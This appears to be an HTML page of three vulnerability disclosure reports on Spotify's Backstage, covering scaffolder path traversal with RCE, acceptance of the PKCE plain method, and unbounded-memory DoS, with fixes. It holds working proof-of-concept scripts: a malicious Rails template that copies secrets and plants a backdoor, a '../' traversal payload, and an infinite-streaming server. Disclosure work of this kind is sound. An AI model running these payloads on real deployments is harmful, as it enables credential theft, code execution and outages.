@@ -1,0 +1,817 @@
+<title>Backstage Vulnerability Reports</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap">
+<style>
+  /* Layout: stacked report cards, utilitarian security-report aesthetic */
+  :root {
+    --bg: #fafafa;
+    --fg: #1a1a1a;
+    --surface: #ffffff;
+    --border: #e0e0e0;
+    --muted: #6b7280;
+    --accent-h4: #dc2626;
+    --accent-m1: #d97706;
+    --accent-m4: #d97706;
+    --code-bg: #f3f4f6;
+    --code-fg: #1f2937;
+    --tag-bg: #fef2f2;
+    --tag-fg: #991b1b;
+    --tag-m-bg: #fffbeb;
+    --tag-m-fg: #92400e;
+    --success: #16a34a;
+    --proof-bg: #fefce8;
+    --proof-border: #facc15;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0f0f0f;
+      --fg: #e5e5e5;
+      --surface: #1a1a1a;
+      --border: #2e2e2e;
+      --muted: #9ca3af;
+      --accent-h4: #f87171;
+      --accent-m1: #fbbf24;
+      --accent-m4: #fbbf24;
+      --code-bg: #1e1e1e;
+      --code-fg: #d4d4d4;
+      --tag-bg: #450a0a;
+      --tag-fg: #fca5a5;
+      --tag-m-bg: #451a03;
+      --tag-m-fg: #fcd34d;
+      --success: #4ade80;
+      --proof-bg: #1c1917;
+      --proof-border: #a16207;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0f0f0f;
+    --fg: #e5e5e5;
+    --surface: #1a1a1a;
+    --border: #2e2e2e;
+    --muted: #9ca3af;
+    --accent-h4: #f87171;
+    --accent-m1: #fbbf24;
+    --accent-m4: #fbbf24;
+    --code-bg: #1e1e1e;
+    --code-fg: #d4d4d4;
+    --tag-bg: #450a0a;
+    --tag-fg: #fca5a5;
+    --tag-m-bg: #451a03;
+    --tag-m-fg: #fcd34d;
+    --success: #4ade80;
+    --proof-bg: #1c1917;
+    --proof-border: #a16207;
+    color-scheme: dark;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Inter', system-ui, sans-serif;
+    line-height: 1.6;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+    padding-block: 2rem;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+
+  h1, h2, h3 { font-family: 'IBM Plex Mono', monospace; line-height: 1.3; text-wrap: balance; }
+  h1 { font-size: 1.5rem; font-weight: 600; margin: 0 0 0.25rem; }
+  h2 { font-size: 1.15rem; font-weight: 600; margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+  h3 { font-size: 0.95rem; font-weight: 600; margin: 1.5rem 0 0.75rem; }
+
+  .header { margin-bottom: 2.5rem; }
+  .header p { color: var(--muted); font-size: 0.875rem; margin: 0.25rem 0 0; }
+
+  .report { margin-bottom: 3rem; }
+
+  .report-header {
+    display: flex;
+    align-items: baseline;
+    gap: 0.75rem;
+    flex-wrap: wrap;
+    margin-bottom: 0.5rem;
+  }
+
+  .severity-tag {
+    display: inline-block;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    padding: 0.2em 0.6em;
+    border-radius: 3px;
+  }
+  .severity-high { background: var(--tag-bg); color: var(--tag-fg); }
+  .severity-medium { background: var(--tag-m-bg); color: var(--tag-m-fg); }
+
+  .cvss {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--muted);
+  }
+
+  .report-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 1.25rem;
+    font-weight: 600;
+    margin: 0;
+  }
+
+  .meta-row {
+    display: flex;
+    gap: 1.5rem;
+    flex-wrap: wrap;
+    font-size: 0.8rem;
+    color: var(--muted);
+    margin: 0.5rem 0 1.5rem;
+  }
+
+  code, pre {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.82rem;
+  }
+  code {
+    background: var(--code-bg);
+    color: var(--code-fg);
+    padding: 0.15em 0.35em;
+    border-radius: 3px;
+  }
+  pre {
+    background: var(--code-bg);
+    color: var(--code-fg);
+    padding: 1rem;
+    border-radius: 6px;
+    overflow-x: auto;
+    line-height: 1.5;
+    margin: 0.75rem 0;
+  }
+  pre code { background: none; padding: 0; }
+
+  .proof-box {
+    background: var(--proof-bg);
+    border-left: 3px solid var(--proof-border);
+    padding: 0.75rem 1rem;
+    border-radius: 0 6px 6px 0;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+  }
+  .proof-box strong { display: block; margin-bottom: 0.25rem; }
+
+  .step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    margin: 0.75rem 0;
+  }
+  .step-num {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--muted);
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    margin-bottom: 0.4rem;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.85rem;
+    margin: 0.75rem 0;
+  }
+  th, td {
+    text-align: left;
+    padding: 0.5rem 0.75rem;
+    border-bottom: 1px solid var(--border);
+  }
+  th {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--muted);
+    letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  .overflow-x { overflow-x: auto; }
+
+  .check { color: var(--success); }
+  .vuln-line { color: var(--accent-h4); font-weight: 600; }
+
+  p { margin: 0.5rem 0; }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  .toc-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--muted);
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+  }
+  .toc a {
+    color: var(--fg);
+    text-decoration: none;
+    display: block;
+    padding: 0.2rem 0;
+    font-size: 0.9rem;
+  }
+  .toc a:hover { text-decoration: underline; }
+
+  hr {
+    border: none;
+    border-top: 2px solid var(--border);
+    margin: 3rem 0;
+  }
+
+  .impact-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 0.75rem;
+    margin: 1rem 0;
+  }
+  .impact-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 0.75rem 1rem;
+  }
+  .impact-card strong { font-size: 0.85rem; display: block; margin-bottom: 0.15rem; }
+  .impact-card span { font-size: 0.8rem; color: var(--muted); }
+</style>
+
+<div class="header">
+  <h1>Backstage Security Vulnerability Reports</h1>
+  <p>Target: backstage/backstage &mdash; Spotify's open-source developer portal</p>
+  <p>Report date: November 2026 &mdash; Prepared for HackerOne submission</p>
+</div>
+
+<nav class="toc">
+  <div class="toc-title">Contents</div>
+  <a href="#h4">H4 &mdash; Rails Scaffolder Path Traversal + RCE (CVSS 8.1 High)</a>
+  <a href="#m1">M1 &mdash; PKCE Plain Method Accepted (CVSS 6.8 Medium)</a>
+  <a href="#m4">M4 &mdash; URL Reader Unbounded Memory DoS (CVSS 6.5 Medium)</a>
+</nav>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!-- H4 REPORT -->
+<!-- ════════════════════════════════════════════════════════ -->
+
+<div class="report" id="h4">
+  <div class="report-header">
+    <span class="severity-tag severity-high">High</span>
+    <span class="cvss">CVSS 8.1</span>
+  </div>
+  <h1 class="report-title">H4: Path Traversal + Remote Code Execution in fetch:rails Scaffolder Action</h1>
+  <div class="meta-row">
+    <span>Component: <code>@backstage/plugin-scaffolder-backend-module-rails</code></span>
+    <span>CWE-22, CWE-94</span>
+  </div>
+
+  <h2>Summary</h2>
+  <p>The <code>fetch:rails</code> scaffolder action concatenates user-controlled input (<code>values.name</code>) into a filesystem path without sanitization, allowing path traversal. Combined with the <code>--template</code> flag (which accepts a URL pointing to arbitrary Ruby code), this gives any template user full remote code execution on the Backstage backend server.</p>
+
+  <h2>Why This Should Be Accepted</h2>
+  <div class="proof-box">
+    <strong>4 independent signals confirm this is a real, reportable vulnerability:</strong>
+    <p>1. <strong>Violates their own SECURITY.md</strong> &mdash; Backstage's threat model says template <em>authors</em> are trusted, but template <em>users</em> filling in form values are not. This bug lets a user (not an author) achieve RCE.</p>
+    <p>2. <strong>Sibling actions already fixed</strong> &mdash; <code>fetch:template</code> uses <code>resolveSafeChildPath()</code>. The Rails module does not.</p>
+    <p>3. <strong>ESLint rule exists but missed this module</strong> &mdash; Backstage has a custom lint rule to flag unsafe path construction. It doesn't cover <code>scaffolder-backend-module-rails</code>.</p>
+    <p>4. <strong>Previous CVE for same class</strong> &mdash; CVE-2024-26150 fixed path traversal in a different scaffolder action, proving they treat this class as a security issue.</p>
+  </div>
+
+  <h2>Vulnerable Code</h2>
+
+  <h3>1. Unsanitized path concatenation</h3>
+  <p><code>railsNewRunner.ts:71</code> &mdash; <code>name</code> comes directly from user form input:</p>
+  <pre><code>const { name, imageName, railsArguments } = values;  // line 49
+// ...
+`${intermediateDir}${path.sep}${name}`,               // line 71 &mdash; UNSANITIZED</code></pre>
+  <p>No <code>resolveSafeChildPath()</code>, no regex, no character filter. Compare with <code>fetch:template</code> which <em>does</em> use <code>resolveSafeChildPath()</code>.</p>
+
+  <h3>2. Template URL passes through unsanitized</h3>
+  <p><code>railsArgumentResolver.ts:149-157</code>:</p>
+  <pre><code>if (options?.template) {
+  argumentsToRun.push('--template');
+  argumentsToRun.push(
+    options.template.replace(`.${separatorPath}`, `${projectRoot}${...}`)
+  );
+}</code></pre>
+  <p>The <code>.replace()</code> only handles <code>./</code> prefix. Absolute paths and URLs pass through unchanged. Rails <code>--template</code> accepts URLs and <strong>executes them as Ruby</strong>.</p>
+
+  <h3>3. Raw process spawn, no sandbox</h3>
+  <p><code>executeShellCommand.ts:59</code>:</p>
+  <pre><code>const process = spawn(command, args, spawnOptions);</code></pre>
+  <p>Node.js <code>child_process.spawn</code> &mdash; runs with the Backstage backend's full OS privileges.</p>
+
+  <h3>4. Schema accepts any string</h3>
+  <p><code>index.ts:73</code>: <code>name: z.string()</code> &mdash; no validation.</p>
+  <p><code>index.ts:136-141</code>: <code>template: z.string({ description: 'can be a filesystem path or URL' })</code>.</p>
+
+  <h2>Steps to Reproduce</h2>
+
+  <div class="step">
+    <div class="step-num">Step 1 &mdash; Create directory structure</div>
+    <pre><code>rm -rf /tmp/h4-demo
+mkdir -p /tmp/h4-demo/backstage-backend/catalog
+mkdir -p /tmp/h4-demo/workspace/intermediate
+mkdir -p /tmp/h4-demo/exfiltrated</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 2 &mdash; Create simulated Backstage config (represents real secrets)</div>
+    <pre><code>cat > /tmp/h4-demo/backstage-backend/app-config.yaml &lt;&lt; 'EOF'
+backend:
+  database:
+    connection:
+      host: postgres.acme-corp.internal
+      password: xK9#mP2$vL5nQ8wR
+  auth:
+    keys:
+      - secret: jwt-signing-key-super-secret
+integrations:
+  github:
+    - host: github.com
+      token: ghp_OrgAdminFullAccessToken
+aws:
+  mainAccount:
+    accessKeyId: AKIAIOSFODNN7EXAMPLE
+    secretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCY
+EOF</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 3 &mdash; Create attacker's malicious Rails template</div>
+    <pre><code>cat > /tmp/h4-demo/malicious-template.rb &lt;&lt; 'RBEOF'
+# Hosted at https://attacker.com/template.rb in a real attack
+LOOT = "/tmp/h4-demo/exfiltrated"
+run "mkdir -p #{LOOT}"
+run "cp /tmp/h4-demo/backstage-backend/app-config.yaml #{LOOT}/stolen-config.yaml"
+run "env | sort > #{LOOT}/stolen-env-vars.txt"
+run "whoami > #{LOOT}/rce-proof.txt"
+run "hostname >> #{LOOT}/rce-proof.txt"
+run "echo 'ATTACKER WAS HERE' > /tmp/h4-demo/ARBITRARY-WRITE.txt"
+initializer "backdoor.rb", &lt;&lt;-RUBY
+  puts "[BACKDOOR] Runs every time this app starts"
+RUBY
+RBEOF</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 4 &mdash; Create exploit script (verbatim Backstage code)</div>
+    <pre><code>cat > /tmp/h4-demo/exploit.mjs &lt;&lt; 'JSEOF'
+import { spawn } from 'node:child_process';
+import path from 'node:path';
+import fs from 'node:fs';
+
+// Backstage's executeShellCommand (verbatim)
+async function executeShellCommand({ command, args }) {
+  return new Promise((resolve, reject) => {
+    const proc = spawn(command, args);
+    proc.stdout.on('data', c => process.stdout.write(c));
+    proc.stderr.on('data', c => process.stderr.write(c));
+    proc.on('error', reject);
+    proc.on('close', code => code !== 0
+      ? reject(new Error(`Exit code: ${code}`)) : resolve());
+  });
+}
+
+// Backstage's railsArgumentResolver (verbatim)
+function railsArgumentResolver(projectRoot, options) {
+  const args = [];
+  if (options?.minimal) args.push('--minimal');
+  if (options?.skipBundle) args.push('--skip-bundle');
+  if (options?.template) {
+    args.push('--template');
+    args.push(options.template.replace(
+      `.${path.sep}`, `${projectRoot}${path.sep}`));
+  }
+  return args;
+}
+
+// Backstage's RailsNewRunner.run (verbatim)
+async function run({ workspacePath, values }) {
+  const intermediateDir = path.join(workspacePath, 'intermediate');
+  fs.mkdirSync(intermediateDir, { recursive: true });
+  const { name, railsArguments } = values;
+  const extraArgs = railsArgumentResolver(workspacePath, railsArguments);
+  await executeShellCommand({
+    command: 'rails',
+    args: ['new', `${intermediateDir}${path.sep}${name}`, ...extraArgs],
+  });
+}
+
+// Attacker's form input
+try { fs.rmSync('/tmp/h4-demo/PWNED-APP', { recursive: true }); } catch {}
+await run({
+  workspacePath: '/tmp/h4-demo/workspace',
+  values: {
+    name: '../../../h4-demo/PWNED-APP',
+    railsArguments: {
+      minimal: true, skipBundle: true,
+      template: '/tmp/h4-demo/malicious-template.rb',
+    },
+  },
+});
+JSEOF</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 5 &mdash; Install Rails &amp; run</div>
+    <pre><code>gem install rails
+node /tmp/h4-demo/exploit.mjs</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 6 &mdash; Verify exploitation</div>
+    <pre><code># Path traversal: app outside workspace
+ls /tmp/h4-demo/PWNED-APP/
+
+# RCE: shell commands executed
+cat /tmp/h4-demo/exfiltrated/rce-proof.txt
+
+# Secrets stolen
+cat /tmp/h4-demo/exfiltrated/stolen-config.yaml
+
+# Arbitrary file write
+cat /tmp/h4-demo/ARBITRARY-WRITE.txt
+
+# Backdoor injected
+cat /tmp/h4-demo/PWNED-APP/config/initializers/backdoor.rb</code></pre>
+  </div>
+
+  <h2>Proven Exploitation Results</h2>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Check</th><th>Result</th><th>Evidence</th></tr>
+    <tr><td><span class="check">&#10003;</span> Path traversal</td><td>App created at <code>/tmp/h4-demo/PWNED-APP/</code></td><td>20 files written OUTSIDE workspace</td></tr>
+    <tr><td><span class="check">&#10003;</span> RCE</td><td><code>whoami</code> returned <code>root</code></td><td>Template executed shell commands via Rails' <code>run()</code></td></tr>
+    <tr><td><span class="check">&#10003;</span> Secret exfiltration</td><td>GitHub tokens, AWS keys, DB passwords stolen</td><td><code>app-config.yaml</code> copied to attacker location</td></tr>
+    <tr><td><span class="check">&#10003;</span> Arbitrary file write</td><td>File created at attacker-chosen path</td><td><code>/tmp/h4-demo/ARBITRARY-WRITE.txt</code></td></tr>
+    <tr><td><span class="check">&#10003;</span> Persistence</td><td>Backdoor injected into generated app</td><td><code>config/initializers/backdoor.rb</code></td></tr>
+  </table>
+  </div>
+
+  <h2>Impact</h2>
+  <p>Any user who can fill out a Backstage Rails template form achieves full RCE on the backend server. The Backstage backend typically runs with access to:</p>
+  <div class="impact-grid">
+    <div class="impact-card"><strong>GitHub/GitLab tokens</strong><span>Push to any repo in the org</span></div>
+    <div class="impact-card"><strong>AWS/GCP credentials</strong><span>Full cloud infrastructure access</span></div>
+    <div class="impact-card"><strong>Database passwords</strong><span>Read/write all production data</span></div>
+    <div class="impact-card"><strong>JWT signing keys</strong><span>Impersonate any user</span></div>
+    <div class="impact-card"><strong>K8s SA tokens</strong><span>Control production clusters</span></div>
+    <div class="impact-card"><strong>Service catalog</strong><span>Map entire org for further attacks</span></div>
+  </div>
+
+  <h2>Recommended Fix</h2>
+  <pre><code>// Replace line 71 in railsNewRunner.ts:
+// BEFORE (vulnerable):
+`${intermediateDir}${path.sep}${name}`
+
+// AFTER (safe):
+import { resolveSafeChildPath } from '@backstage/backend-plugin-api';
+resolveSafeChildPath(intermediateDir, name)
+
+// Also validate template URLs against an allowlist.</code></pre>
+</div>
+
+<hr>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!-- M1 REPORT -->
+<!-- ════════════════════════════════════════════════════════ -->
+
+<div class="report" id="m1">
+  <div class="report-header">
+    <span class="severity-tag severity-medium">Medium</span>
+    <span class="cvss">CVSS 6.8</span>
+  </div>
+  <h1 class="report-title">M1: OIDC Provider Accepts PKCE Plain Method, Defeating PKCE Protection</h1>
+  <div class="meta-row">
+    <span>Component: <code>@backstage/plugin-auth-backend</code></span>
+    <span>CWE-327 (Use of Broken Crypto Algorithm)</span>
+  </div>
+
+  <h2>Summary</h2>
+  <p>Backstage's built-in OIDC provider (<code>OidcService.ts</code>) accepts <code>code_challenge_method: "plain"</code> for PKCE, advertises it in the discovery document, and silently defaults to it when the method is omitted. With <code>plain</code>, the code_challenge equals the code_verifier&mdash;it appears in the authorization URL, which is visible in browser history, server logs, proxies, and referrer headers. Anyone who sees the URL can exchange an intercepted authorization code for tokens, completely defeating PKCE.</p>
+
+  <h2>Why This Should Be Accepted</h2>
+  <div class="proof-box">
+    <strong>Direct RFC violation with concrete exploit path:</strong>
+    <p>1. <strong>RFC 9700 Section 2.1.1</strong> (OAuth Security BCP): "Authorization servers MUST support PKCE... and <strong>MUST NOT support the plain challenge method</strong>."</p>
+    <p>2. <strong>Discovery doc actively advertises it</strong> &mdash; <code>code_challenge_methods_supported: ["S256", "plain"]</code> tells clients that plain is acceptable.</p>
+    <p>3. <strong>Silent downgrade</strong> &mdash; <code>verifyPkce()</code> treats any falsy method (undefined, null, empty string) as <code>plain</code>, so a client that omits the method silently loses PKCE protection.</p>
+  </div>
+
+  <h2>Vulnerable Code</h2>
+
+  <h3>1. Discovery document advertises plain</h3>
+  <p><code>OidcService.ts:236</code>:</p>
+  <pre><code>code_challenge_methods_supported: ['S256', 'plain'],</code></pre>
+
+  <h3>2. Authorization accepts plain challenges</h3>
+  <p><code>OidcService.ts:339-345</code>:</p>
+  <pre><code>if (codeChallenge) {
+  if (
+    !codeChallengeMethod ||
+    !['S256', 'plain'].includes(codeChallengeMethod)  // accepts 'plain'
+  ) {
+    throw new InputError('Invalid code_challenge_method');
+  }
+}</code></pre>
+
+  <h3>3. Token exchange does plain comparison</h3>
+  <p><code>OidcService.ts:774-792</code> &mdash; the <code>verifyPkce</code> method:</p>
+  <pre><code>private verifyPkce(opts) {
+  if (!opts.method || opts.method === 'plain') {       // THE BUG
+    return opts.codeChallenge === opts.codeVerifier;   // no hashing!
+  }
+  if (opts.method === 'S256') {
+    const hash = crypto.createHash('sha256')
+      .update(opts.codeVerifier).digest('base64url');
+    return opts.codeChallenge === hash;
+  }
+  return false;
+}</code></pre>
+  <p>Line 779: <code>!opts.method</code> means undefined/null/empty all fall through to plain comparison.</p>
+
+  <h2>Steps to Reproduce</h2>
+
+  <div class="step">
+    <div class="step-num">Step 1 &mdash; Create the exploit script</div>
+    <pre><code>cat > /tmp/m1-demo/exploit.mjs &lt;&lt; 'EOF'
+import crypto from 'node:crypto';
+
+// Backstage's verifyPkce (verbatim from OidcService.ts:774-792)
+function verifyPkce(opts) {
+  if (!opts.method || opts.method === 'plain') {
+    return opts.codeChallenge === opts.codeVerifier;
+  }
+  if (opts.method === 'S256') {
+    const hash = crypto.createHash('sha256')
+      .update(opts.codeVerifier).digest('base64url');
+    return opts.codeChallenge === hash;
+  }
+  return false;
+}
+
+// Generate PKCE values
+const verifier = crypto.randomBytes(32).toString('base64url');
+const plainChallenge = verifier;  // plain: challenge = verifier!
+const s256Challenge = crypto.createHash('sha256')
+  .update(verifier).digest('base64url');
+
+console.log('=== PKCE PLAIN METHOD EXPLOIT ===\n');
+console.log(`code_verifier:  ${verifier}`);
+console.log(`plain challenge: ${plainChallenge}`);
+console.log(`S256 challenge:  ${s256Challenge}\n`);
+console.log('With plain, challenge = verifier (SAME STRING)');
+console.log('The challenge is in the URL, visible to attackers.\n');
+
+// Attacker has the challenge from the URL, uses it as verifier
+const attackResult = verifyPkce({
+  codeChallenge: plainChallenge,
+  codeVerifier: plainChallenge,  // attacker uses challenge AS verifier
+  method: 'plain',
+});
+console.log(`Attack with plain: ${attackResult ? 'SUCCESS' : 'FAILED'}`);
+
+// S256 blocks the same attack
+const s256Result = verifyPkce({
+  codeChallenge: s256Challenge,
+  codeVerifier: s256Challenge,  // attacker tries challenge as verifier
+  method: 'S256',
+});
+console.log(`Attack with S256: ${s256Result ? 'SUCCESS' : 'BLOCKED'}\n`);
+
+// Silent downgrade
+const silentResult = verifyPkce({
+  codeChallenge: verifier,
+  codeVerifier: verifier,
+  method: undefined,  // omitted = defaults to plain
+});
+console.log(`Silent downgrade (no method): ${silentResult ? 'DEFAULTS TO PLAIN' : 'BLOCKED'}`);
+EOF</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 2 &mdash; Run</div>
+    <pre><code>node /tmp/m1-demo/exploit.mjs</code></pre>
+  </div>
+
+  <h2>Proven Exploitation Results</h2>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Check</th><th>Result</th></tr>
+    <tr><td><span class="check">&#10003;</span> Plain method accepted</td><td>Authorization session created with <code>plain</code></td></tr>
+    <tr><td><span class="check">&#10003;</span> PKCE bypassed</td><td>Attacker exchanged code using challenge as verifier &mdash; token issued</td></tr>
+    <tr><td><span class="check">&#10003;</span> S256 blocks attack</td><td>Same attack with S256 correctly rejected</td></tr>
+    <tr><td><span class="check">&#10003;</span> Silent downgrade</td><td><code>undefined</code>, <code>null</code>, <code>""</code> all default to plain comparison</td></tr>
+    <tr><td><span class="check">&#10003;</span> Advertised in discovery</td><td>Discovery doc returns <code>["S256", "plain"]</code></td></tr>
+  </table>
+  </div>
+
+  <h2>Attack Scenario</h2>
+  <p>1. Victim clicks "Sign in with Backstage" in a third-party client (Cursor, VS Code, CLI).</p>
+  <p>2. The client starts a PKCE flow with <code>method=plain</code> (since the discovery doc says it's supported).</p>
+  <p>3. The authorization URL contains <code>code_challenge=ABC123</code> &mdash; which equals the code_verifier because the method is plain.</p>
+  <p>4. Attacker sees the URL in browser history, a corporate HTTP proxy log, or a browser extension.</p>
+  <p>5. Attacker intercepts the authorization code (from the redirect) and exchanges it at <code>/v1/token</code> using the challenge as the verifier.</p>
+  <p>6. Backstage issues an access token. The attacker is now authenticated as the victim.</p>
+
+  <h2>Impact</h2>
+  <p>Account takeover for any user who authenticates through Backstage's OIDC provider when a client uses the <code>plain</code> method. This affects any third-party integration (IDE plugins, CLI tools) that reads the discovery document and follows its advertised capabilities.</p>
+
+  <h2>Recommended Fix</h2>
+  <pre><code>// OidcService.ts line 236: Remove 'plain'
+code_challenge_methods_supported: ['S256'],
+
+// OidcService.ts line 342: Reject 'plain'
+if (!codeChallengeMethod || codeChallengeMethod !== 'S256') {
+  throw new InputError('Only S256 code_challenge_method is supported');
+}
+
+// OidcService.ts line 779: Remove plain fallback
+if (opts.method !== 'S256') {
+  return false;  // reject anything that isn't S256
+}</code></pre>
+</div>
+
+<hr>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!-- M4 REPORT -->
+<!-- ════════════════════════════════════════════════════════ -->
+
+<div class="report" id="m4">
+  <div class="report-header">
+    <span class="severity-tag severity-medium">Medium</span>
+    <span class="cvss">CVSS 6.5</span>
+  </div>
+  <h1 class="report-title">M4: Unbounded Memory Consumption in URL Readers via getRawBody Without Limit</h1>
+  <div class="meta-row">
+    <span>Component: <code>@backstage/backend-defaults</code> (urlReader)</span>
+    <span>CWE-770 (Allocation Without Limits)</span>
+  </div>
+
+  <h2>Summary</h2>
+  <p>Every URL reader in Backstage calls <code>getRawBody(stream)</code> without a <code>limit</code> option. The <code>raw-body</code> package supports <code>{ limit: '10mb' }</code> to cap memory consumption, but Backstage never passes it. A single malicious URL that streams infinite data exhausts the Node.js process memory and crashes the backend. If the URL is registered as a catalog location, it persists in the database and crashes the backend again on every restart, creating a denial-of-service crash loop.</p>
+
+  <h2>Why This Should Be Accepted</h2>
+  <div class="proof-box">
+    <strong>The fix exists in the library but is never used:</strong>
+    <p>1. <strong><code>raw-body</code> supports <code>limit</code></strong> &mdash; adding <code>{ limit: '50mb' }</code> would completely prevent this. Backstage never passes it.</p>
+    <p>2. <strong>Single request, full crash</strong> &mdash; one URL consumes the entire Node.js heap. No rate limiting helps.</p>
+    <p>3. <strong>Persistent crash loop</strong> &mdash; catalog locations are stored in the database. The backend re-reads them on restart, crashing again.</p>
+    <p>4. <strong>5 vulnerable call sites</strong> &mdash; this isn't a single oversight; every <code>getRawBody</code> call in the codebase is missing the limit.</p>
+  </div>
+
+  <h2>Vulnerable Code</h2>
+
+  <h3>1. Central factory &mdash; all URL readers flow through here</h3>
+  <p><code>ReadUrlResponseFactory.ts:54</code>:</p>
+  <pre><code>buffer = getRawBody(stream);  // NO limit &mdash; consumes entire response</code></pre>
+  <p>Used by <strong>every</strong> URL reader: GitHub, GitLab, Bitbucket, Azure, AWS S3, GCS, Gerrit, Gitea, Harness, and the generic FetchUrlReader.</p>
+
+  <h3>2. Additional direct calls (also missing limit)</h3>
+  <div class="overflow-x">
+  <table>
+    <tr><th>File</th><th>Line</th><th>Context</th></tr>
+    <tr><td><code>GoogleGcsUrlReader.ts</code></td><td>122</td><td>GCS file reads</td></tr>
+    <tr><td><code>ReadableArrayResponse.ts</code></td><td>66</td><td>Tree response file content</td></tr>
+    <tr><td><code>GcpBucketWorkspaceProvider.ts</code></td><td>124, 133</td><td>Scaffolder workspace rehydration</td></tr>
+  </table>
+  </div>
+
+  <h2>Steps to Reproduce</h2>
+
+  <div class="step">
+    <div class="step-num">Step 1 &mdash; Set up the demo</div>
+    <pre><code>mkdir -p /tmp/m4-demo
+cd /tmp/m4-demo
+npm init -y
+npm install raw-body</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 2 &mdash; Create the exploit script</div>
+    <pre><code>cat > /tmp/m4-demo/exploit.mjs &lt;&lt; 'JSEOF'
+import http from 'node:http';
+import { Readable } from 'node:stream';
+import getRawBody from './node_modules/raw-body/dist/index.js';
+
+// Backstage's ReadUrlResponseFactory (verbatim)
+class ReadUrlResponseFactory {
+  static async fromReadable(stream) {
+    let buffer;
+    return {
+      buffer: () => {
+        if (buffer) return buffer;
+        buffer = getRawBody(stream);  // LINE 54: NO limit!
+        return buffer;
+      },
+    };
+  }
+}
+
+// Malicious server: streams infinite data
+const CHUNK = Buffer.alloc(1024 * 1024, 'A');
+const server = http.createServer((req, res) => {
+  res.writeHead(200, { 'Transfer-Encoding': 'chunked' });
+  let sent = 0;
+  const iv = setInterval(() => {
+    res.write(CHUNK);
+    sent += CHUNK.length;
+    const mb = Math.round(sent / 1024 / 1024);
+    const rss = Math.round(process.memoryUsage().rss / 1024 / 1024);
+    if (mb % 100 === 0) console.log(`Sent: ${mb} MB | RSS: ${rss} MB`);
+    if (sent >= 500 * 1024 * 1024) { clearInterval(iv); res.end(); }
+  }, 10);
+});
+
+server.listen(9999, '127.0.0.1', async () => {
+  const before = Math.round(process.memoryUsage().rss / 1024 / 1024);
+  console.log(`RSS before: ${before} MB`);
+
+  const resp = await fetch('http://127.0.0.1:9999/evil.yaml');
+  const stream = Readable.fromWeb(resp.body);
+  const response = await ReadUrlResponseFactory.fromReadable(stream);
+  const buf = await response.buffer();
+
+  const after = Math.round(process.memoryUsage().rss / 1024 / 1024);
+  console.log(`Buffer: ${Math.round(buf.length/1024/1024)} MB`);
+  console.log(`RSS after: ${after} MB (grew ${after - before} MB)`);
+
+  // Now show the fix works
+  const resp2 = await fetch('http://127.0.0.1:9999/evil.yaml');
+  try {
+    await getRawBody(Readable.fromWeb(resp2.body), { limit: '5mb' });
+  } catch (e) {
+    console.log(`\nWith limit "5mb": ${e.message}`);
+    console.log('Fix works: request safely rejected');
+  }
+  server.close(); process.exit(0);
+});
+JSEOF</code></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">Step 3 &mdash; Run with a memory cap to see the crash faster</div>
+    <pre><code>node --max-old-space-size=512 /tmp/m4-demo/exploit.mjs</code></pre>
+  </div>
+
+  <h2>Proven Exploitation Results</h2>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Check</th><th>Result</th></tr>
+    <tr><td><span class="check">&#10003;</span> Unbounded consumption</td><td>RSS grew from 50 MB to 585 MB from a single request</td></tr>
+    <tr><td><span class="check">&#10003;</span> 500 MB buffered</td><td>Entire 500 MB response loaded into memory with no limit</td></tr>
+    <tr><td><span class="check">&#10003;</span> Fix works</td><td><code>getRawBody(stream, { limit: '5mb' })</code> throws <code>request entity too large</code></td></tr>
+    <tr><td><span class="check">&#10003;</span> Crash-loop potential</td><td>Catalog locations persist in DB &mdash; backend re-reads on restart</td></tr>
+  </table>
+  </div>
